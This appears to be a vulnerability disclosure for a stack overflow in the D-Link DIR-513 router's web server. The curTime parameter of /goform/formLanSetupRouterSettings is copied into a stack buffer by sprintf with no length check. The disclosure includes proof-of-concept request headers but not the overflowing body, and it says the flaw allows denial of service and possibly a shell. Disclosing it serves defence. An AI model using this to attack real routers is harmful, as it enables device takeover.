Trigger location: formLanSetupRouterSettings function of the network service program boa program, sprintf(v35, "/Basic/Network.asp?t=%s", var); Sentence place
```
POCï¼š
POST /goform/formLanSetupRouterSettings HTTP/1.1
Host: 192.168.0.1
Content-Length: 6158
Cache-Control: max-age=0
Origin: http://192.168.0.1
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.0.1/Basic/wan_dhcp.asp?t=1746449779452
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: keep-alive


```
<img width="907" height="637" alt="image" src="https://github.com/user-attachments/assets/cfff2949-5a63-4162-9eb8-35071f6442e5" />

DIR-513 implements the web service through the boa program, which is initialized through the websAspInit function, and sets a series of callback APIs, and can trigger the callback function formLanSetupRouterSettings through the POST request access path /goform/formLanSetupRouterSettings. The function will get the curTime parameter from the request body, which will be applied to the subsequent sprintf(v35, "/Basic/Network.asp?t=%s", var); Stitched to the stack variable through sprintf, because curTime is not checked for length, curTime can be too long to trigger a stack overflow vulnerability that causes the program to deny service, and further exploit the shell permissions that can obtain the program
